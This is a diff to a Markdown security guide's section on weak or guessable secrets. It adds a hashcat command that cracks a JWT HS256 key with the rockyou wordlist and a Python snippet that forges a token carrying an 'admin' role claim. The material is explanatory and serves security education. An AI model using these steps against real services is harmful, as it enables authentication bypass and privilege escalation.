@@ -6,12 +6,27 @@
 
 ## Known or Guessable Secrets
 
-### Using secrets that are easily guessed or commonly found in wordlists can compromise the service.
+### Using secrets that are easily guessed or commonly found in wordlists can compromise the entire service.
 
-- JWT (HS256) secret key crack
-   ```bash
-   hashcat -m 16500 -a 0 hash.txt secret_key_list.txt
-   ```
+- Compromises in authentication systems
+  1. JWT (HS256) secret key crack
+      ```bash
+      hashcat -m 16500 -a 0 hash.txt rockyou.txt
+      ```
+  2. Creating a forged JWT
+      ```python
+      import jwt
+      
+      secret_key = "secret123" #secret key cracked with hashcat
+      
+      payload = {
+          "sub": "user_123",
+          "role": "admin"
+      }
+      
+      token = jwt.encode(payload, secret_key, algorithm="HS256")
+      print(f"Generated JWT: {token}")
+      ```
    
 - Easily guessable admin credentials
    ```bash
